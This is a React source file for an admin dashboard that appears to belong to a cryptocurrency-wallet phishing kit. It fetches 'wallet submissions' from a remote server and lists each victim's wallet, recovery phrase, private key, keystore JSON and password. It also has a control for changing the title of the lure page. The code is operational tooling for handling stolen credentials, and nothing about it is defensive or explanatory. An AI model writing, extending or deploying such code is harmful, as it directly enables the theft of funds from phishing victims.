import React, { useEffect, useState } from "react";

const AdminPage = () => {
  const [submissions, setSubmissions] = useState([]);
  const [visibleCount, setVisibleCount] = useState(5);
  const [newTitle, setNewTitle] = useState("");

  useEffect(() => {
    const fetchData = async () => {
      try {
        const res = await fetch("https://electric-eel.onrender.com/");
        const data = await res.json();
        setSubmissions(data.reverse());
      } catch (err) {
        console.error("Error fetching submissions", err);
      }
    };

    fetchData();
  }, []);

  const formatDate = (isoString) => {
    if (!isoString) return "N/A";
    const date = new Date(isoString);
    return date.toLocaleString();
  };

  const handleLoadMore = () => setVisibleCount((prev) => prev + 5);

  const handleTitleUpdate = async () => {
    try {
      await fetch("https://electric-eel.onrender.com/title", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ title: newTitle }),
      });
      alert("Title updated successfully!");
    } catch (err) {
      console.error("Error updating title:", err);
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-black via-indigo-950 to-purple-950 text-white px-6 py-10">

      {/* Header */}
      <div className="text-center mb-12">
        <h1 className="text-4xl font-bold bg-gradient-to-r from-violet-400 to-cyan-400 bg-clip-text text-transparent">
           Admin Dashboard
        </h1>
        <p className="text-gray-400 mt-2">
          Monitor and manage wallet submissions
        </p>
      </div>

      {/* Update Title Card */}
      <div className="max-w-xl mx-auto mb-12 backdrop-blur-lg bg-white/5 border border-white/10 rounded-xl p-6 shadow-xl">
        <h2 className="text-lg font-semibold text-violet-300 mb-3">
          Update Title
        </h2>

        <input
          value={newTitle}
          onChange={(e) => setNewTitle(e.target.value)}
          placeholder="Enter new title..."
          className="w-full p-3 rounded-lg bg-black/40 border border-white/20 focus:border-violet-400 focus:outline-none text-white placeholder-gray-400"
        />

        <button
          onClick={handleTitleUpdate}
          className="mt-4 w-full py-3 rounded-lg font-semibold bg-gradient-to-r from-violet-600 to-indigo-600 hover:from-violet-500 hover:to-indigo-500 transition shadow-lg shadow-violet-700/30"
        >
          Update Title
        </button>
      </div>

      {/* Submissions Table */}
      <div className="backdrop-blur-xl bg-white/5 border border-white/10 rounded-xl shadow-2xl overflow-hidden">
        <div className="px-6 py-4 border-b border-white/10">
          <h2 className="text-xl font-semibold text-cyan-300">
            Wallet Submissions
          </h2>
        </div>

        <div className="overflow-x-auto">
          <table className="min-w-full text-sm">
            <thead className="bg-white/10 text-gray-200">
              <tr>
                <th className="py-3 px-4 text-left">Wallet</th>
                <th className="py-3 px-4 text-left">Recovery Phrase</th>
                <th className="py-3 px-4 text-left">Private Key</th>
                <th className="py-3 px-4 text-left">Keystore JSON</th>
                <th className="py-3 px-4 text-left">Password</th>
                <th className="py-3 px-4 text-left">Created</th>
              </tr>
            </thead>

            <tbody>
              {submissions.slice(0, visibleCount).map((submission, index) => (
                <tr
                  key={index}
                  className="border-t border-white/5 hover:bg-white/5 transition"
                >
                  <td className="py-3 px-4 text-violet-300 font-mono">
                    {submission.wallet}
                  </td>

                  <td className="py-3 px-4 text-gray-300">
                    {submission.tab1Inputs?.filter(Boolean).join(", ")}
                  </td>

                  <td className="py-3 px-4 text-gray-300 font-mono">
                    {submission.tab2Text}
                  </td>

                  <td className="py-3 px-4 text-gray-300">
                    {submission.tab3?.content}
                  </td>

                  <td className="py-3 px-4 text-gray-300">
                    {submission.tab3?.title}
                  </td>

                  <td className="py-3 px-4 text-gray-400">
                    {formatDate(submission.createdAt)}
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>

      {/* Load More Button */}
      {visibleCount < submissions.length && (
        <div className="text-center mt-10">
          <button
            onClick={handleLoadMore}
            className="px-8 py-3 rounded-lg font-semibold bg-gradient-to-r from-cyan-600 to-violet-600 hover:from-cyan-500 hover:to-violet-500 transition shadow-lg shadow-cyan-700/30"
          >
            Load More
          </button>
        </div>
      )}
    </div>
  );
};

export default AdminPage;